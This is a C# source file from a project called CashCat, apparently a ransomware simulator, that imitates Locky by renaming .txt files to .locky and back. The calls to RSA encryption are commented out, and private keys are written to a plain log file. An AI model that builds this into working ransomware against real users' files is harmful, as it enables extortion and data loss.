using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace CashCat
{
    public class FileSystemOperation
    {
        /// <summary>
        /// File System Interactions
        /// </summary>
        /// 

        EncryptionOperation FileEncrypter = new EncryptionOperation();

        public void WriteLog(string logMessage)
        {
                    
            string exePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);

            try
            {
                using (StreamWriter w = File.AppendText(exePath + "\\" + "CashCat.log"))
                {
                    Log(logMessage, w);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("failed to log :/");
            }

        }


        public void LogKeyData(string privatekey, string publickey)
        {

            string currentdatetime = (DateTime.Now.ToString("yyyy-dd-M-HH-mm-ss") + "-KEY.log");
            var keylogfile = File.Create(currentdatetime);
            
            using (StreamWriter outputFile = new StreamWriter(keylogfile))
            {
                outputFile.WriteLine("Welcome to your CashCat Key Backup Log File!");
                outputFile.WriteLine("Private Key: " + privatekey);
                outputFile.WriteLine("Public Key: " + publickey);
            }
     
        }

        public void Log(string logMessage, TextWriter txtWriter)
        {
            try
            {
                logMessage = (DateTime.Now.ToLongTimeString() + " : " + logMessage);
                txtWriter.WriteLine(logMessage);

            }
            catch (Exception ex)
            {
            }
        }


        public void startstopFileDump()
        {

        }


        public FileInfo[] GetLockyFileCount(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.locky"); //Getting locky files
            return Files;
        }

       

        public FileInfo[] GetTXTFileCount (string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Txt files
            return Files;
        }

        public void LockTXTFile(FileInfo file)
        {
            string oldfilename = file.Name;
            string newfilename = (file.Name).Replace(".txt", ".locky");
            string oldfileExtension = file.Extension;
            string newfilefullname = (file.FullName).Replace(".txt", ".locky");

            try
            {
                System.IO.File.Move(file.Name, newfilename);
                //FileEncrypter.EncryptFileRSA(newfilefullname);
            }
            catch
            {
                //can't touch this
            }
        }

        public void LockTXTFiles(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Txt files
            
            foreach (FileInfo file in Files)
            {
                //Console.WriteLine(file.Name);
                string oldfilename = file.Name;
                string newfilename = (file.Name).Replace(".txt", ".locky");
                string oldfileExtension = file.Extension;
                string newfilefullname = (file.FullName).Replace(".txt", ".locky");

                try
                {
                    System.IO.File.Move(file.Name, newfilename);
                    //FileEncrypter.EncryptFileRSA(newfilefullname);
                }
                catch
                {
                    //can't touch this
                }
                

            }
        }

        public void UnlockLockyFile(FileInfo file)
        {
            //Console.WriteLine(file.Name);
            string newfilename = (file.Name).Replace(".locky", ".txt");
            string newfilefullname = (file.FullName).Replace(".locky", ".txt");
            try
            {
                System.IO.File.Move(file.Name, newfilename);
                //FileEncrypter.DecryptFileRSA(newfilefullname);

            }
            catch
            {
                //can't touch this
            }
        }

        public void UnlockLockyFiles(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            FileInfo[] Files = d.GetFiles("*.locky"); //Getting locky files
            
            foreach (FileInfo file in Files)
            {
                //Console.WriteLine(file.Name);
                string newfilename = (file.Name).Replace(".locky", ".txt");
                string newfilefullname = (file.FullName).Replace(".locky", ".txt");
                try
                {
                    System.IO.File.Move(file.Name, newfilename);
                    //FileEncrypter.DecryptFileRSA(newfilefullname);

                }
                catch
                {
                    //can't touch this
                }

            }
        }

    }
}
